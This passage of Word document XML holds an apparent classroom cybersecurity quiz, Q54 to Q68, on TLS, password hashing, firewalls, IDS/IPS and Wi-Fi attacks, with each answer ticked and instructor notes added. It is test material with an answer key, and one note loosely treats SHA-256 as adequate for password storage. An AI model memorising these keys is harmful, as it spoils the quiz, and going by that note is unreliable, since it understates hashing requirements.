        <w:t>D) Encrypts traffic between web servers and clients</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* CA = trusted third party. Chain of trust: Root CA → Intermediate CA → End-entity certificate.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q54</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>During a TLS handshake, why is asymmetric encryption used first, then switched to symmetric?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Symmetric encryption is less secure and used only for initial setup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Asymmetric encryption cannot handle large data volumes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Asymmetric encryption securely exchanges a session key; symmetric encryption is then faster for bulk data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) TLS only uses asymmetric encryption throughout the entire connection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Hybrid approach — best of both worlds. RSA/ECDHE for key exchange, AES-256 for session data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q55</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is a "rainbow table" attack?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A multi-vector attack using seven different attack methods simultaneously</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) A phishing attack using colourful social engineering emails</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A precomputed table of hash values used to reverse-lookup passwords from stolen hashes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) An attack that injects coloured HTML into web pages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Defence: password salting (adding random data before hashing) makes rainbow tables useless.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q56</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SSL 3.0 and TLS 1.0/1.1 have been deprecated. The recommended minimum TLS version is:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) TLS 1.0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) TLS 1.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) TLS 1.2 (acceptable) or TLS 1.3 (recommended) ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) SSL 3.0 patched</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* TLS 1.3 (2018) removes weak cipher suites, mandates forward secrecy. PCI DSS 3.2+ requires minimum TLS 1.2.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q57</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is "forward secrecy" (also called "perfect forward secrecy")?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A system that automatically forwards encrypted emails securely</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) An algorithm that encrypts files before they are created</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A property where compromise of a long-term key does NOT decrypt previously recorded sessions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A firewall feature that blocks forward-facing threats</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Achieved via ephemeral Diffie-Hellman key exchange. Each session gets a unique key. Even if RSA private key is stolen, past sessions stay secret.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q58</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CyberChef is used in cybersecurity to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Monitor firewall logs in real time</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Scan web applications for SQL injection vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Encode, decode, encrypt, decrypt, and analyse data in a web browser</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Generate phishing emails for security awareness testing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* "Swiss Army knife of data analysis" — Base64, XOR, AES, hex, URL encoding all in one tool. Free at gchq.github.io/CyberChef.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q59</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>An attacker intercepts encrypted HTTPS traffic saved from six months ago. Today they steal the server's private RSA key. Can they decrypt the old traffic?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Yes, because RSA can decrypt any historical TLS traffic</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Only if the traffic was captured on the same network as the server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>No — if the server used Diffie-Hellman (ECDHE) cipher suites, forward secrecy protects old sessions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Yes, because private keys always match all historical session keys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* The "harvest now, decrypt later" threat model. Forward secrecy directly counters this. Critical for post-quantum cryptography discussion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q60</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A developer stores user passwords in a MySQL database as MD5 hashes without salt. The database is breached. An attacker runs the hashes through a rainbow table and recovers 70% of passwords in 2 minutes. What THREE things did the developer do wrong?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Used AES instead of RSA; no HTTPS; no firewall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Used broken MD5; no salt; no slow hashing algorithm (bcrypt/Argon2)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Used symmetric encryption; no SSL; exposed the database publicly</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Used SHA-256; no pepper; no database backups</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Three errors in one: MD5 broken → SHA-256 minimum; no salt → rainbow tables work; fast hash → GPU cracks thousands/second. Debrief: NDPA 2023 requires "appropriate technical security measures" — storing MD5 passwords may constitute a violation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 5 [INTERMEDIATE]: Network Security &amp; Firewalls</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Intermediate | Questions: Q61–Q75*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q61</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which type of firewall only checks IP addresses and port numbers without tracking connection state?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Next-Generation Firewall (NGFW)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Stateful Inspection Firewall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Web Application Firewall (WAF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Packet-filtering Firewall</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Packet-filtering = L3/L4 only, stateless. Can't detect attacks that span multiple packets.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q62</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the key advantage of a stateful firewall over a packet-filtering firewall?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) It runs faster because it checks fewer rules</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) It can decrypt TLS traffic</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>It tracks the state of connections and can identify out-of-sequence packets as suspicious</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) It requires no configuration rules</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* State table tracks established connections — blocks packets that don't belong to known sessions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q63</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which firewall type can inspect HTTP content, detect SQL injection, and block malicious application-layer attacks?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Packet-filtering firewall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Stateful inspection firewall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) VPN gateway</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Next-Generation Firewall (NGFW) or Web Application Firewall (WAF)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* NGFWs go up to Layer 7 — application awareness. WAF specifically for web traffic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q64</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the purpose of a DMZ (Demilitarised Zone) in network architecture?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A zone where security policies are relaxed for trusted users</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) A network segment with no internet access for maximum protection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A buffer zone between the internet and the internal network hosting public-facing services</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A hardware appliance that filters DNS traffic</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Web servers, mail servers in DMZ. Even if compromised, attacker still separated from internal LAN.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q65</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the difference between an IDS and an IPS?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) IDS is hardware; IPS is software</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) IPS monitors traffic; IDS blocks it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IDS detects and alerts; IPS detects AND actively blocks or drops malicious traffic</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) IDS is used for wireless; IPS for wired networks only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* IDS = passive alarm. IPS = active intervention. IPS sits inline with traffic; IDS uses a tap/mirror port.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q66</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Snort is a widely used open-source tool for:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Vulnerability scanning of web applications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Password cracking and hash analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Network intrusion detection and prevention (IDS/IPS)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Wireless network auditing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Snort = signature + anomaly detection. Runs on Linux. Used in enterprise SOCs worldwide.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q67</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WPA2 uses which encryption standard?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) DES</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) RC4 (same as WEP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) 3DES</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AES</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* WEP = RC4 (broken). WPA = TKIP (improved RC4, still weak). WPA2 = AES-CCMP (strong). WPA3 = SAE (strongest).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q68</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>An attacker sets up a Wi-Fi hotspot called "MTN Free WiFi" in a Lagos bus park. Users connect and their traffic is intercepted. This attack is called:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) WPS brute force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Deauthentication attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evil twin / rogue access point attack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Wardriving</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Very common in Nigerian public spaces — airports, cafés, bus parks. VPN on public WiFi is essential.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
